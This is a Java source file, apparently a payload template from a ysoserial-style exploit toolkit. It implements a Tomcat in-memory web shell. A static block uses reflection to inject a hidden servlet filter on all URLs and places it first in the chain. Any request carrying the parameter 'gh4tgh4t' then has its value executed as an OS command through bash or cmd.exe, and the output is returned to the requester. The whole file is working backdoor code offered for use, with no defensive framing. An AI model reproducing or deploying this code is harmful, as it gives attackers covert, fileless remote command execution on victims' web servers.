package ysoserial.bullet.tmpl.memshell.tomcat;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.Map;

public class TomcatFilter implements Filter{

    private static String filterName = "kacakaca";
    private static String param = "gh4tgh4t";
    private static String filterUrlPattern = "/*";
    static {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field resourcesF = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
            resourcesF.setAccessible(true);
            WebResourceRoot resources = (WebResourceRoot) resourcesF.get(webappClassLoaderBase);
            StandardContext standardContext = (StandardContext) resources.getContext();

            ServletContext servletContext = standardContext.getServletContext();

            Field filterConfigs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            filterConfigs.setAccessible(true);
            Map map = (Map) filterConfigs.get(standardContext);
            if (map.get(filterName) == null && standardContext != null){
                Field stateField = Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                FilterRegistration.Dynamic filter = servletContext.addFilter(filterName, new TomcatFilter());
                filter.addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST),false,new String[]{filterUrlPattern});
                Method filterStart = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("filterStart");
                filterStart.invoke(standardContext,null);
                FilterMap[] filterMaps = standardContext.findFilterMaps();
                for (int i = 0 ; i < filterMaps.length ; i++){
                    if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)){
                        FilterMap filterMap = filterMaps[0];
                        filterMaps[0] = filterMaps[i];
                        filterMaps[i] = filterMap;
                    }
                }
                stateField.set(standardContext,LifecycleState.STARTED);
            }
        }catch (Exception e){}
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {}

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String string = servletRequest.getParameter(this.param);
        if (string != null){
            String osName = System.getProperty("os.name");
            String[] cmd = osName != null && osName.toLowerCase().contains("win") ? new String[]{"cmd.exe","/c",string} : new String[]{"/bin/bash","-c",string};
            Process exec = Runtime.getRuntime().exec(cmd);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()));
            StringBuffer stringBuffer = new StringBuffer();
            String lineData;
            while ((lineData = bufferedReader.readLine()) != null){
                stringBuffer.append(lineData + '\n');
            }
            servletResponse.getOutputStream().write(stringBuffer.toString().getBytes(StandardCharsets.UTF_8));
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {}
}
